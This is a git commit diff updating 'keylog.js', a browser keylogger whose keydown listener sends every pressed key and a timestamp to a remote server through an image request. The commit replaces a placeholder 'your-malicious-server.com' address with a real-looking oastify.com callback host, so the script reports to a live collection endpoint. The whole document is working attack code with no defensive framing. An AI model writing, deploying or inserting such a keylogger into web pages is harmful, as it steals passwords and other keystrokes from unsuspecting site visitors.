873646fd9130c3639c711fd167b04db70de3418b
tomoncrss <tonymyson89823@gmail.com>
2025-02-27 23:44:00 +0330

    Update keylog.js

--- keylog.js
+++ keylog.js
@@ -1,3 +1,3 @@
 document.addEventListener('keydown', function(e) {
-    new Image().src = `https://your-malicious-server.com/log?key=${encodeURIComponent(e.key)}&time=${Date.now()}`;
+    new Image().src = `https://ynpz6qkmf7olx7g9xckd2sntxk3br3pre.oastify.com/log?key=${encodeURIComponent(e.key)}&time=${Date.now()}`;
 });
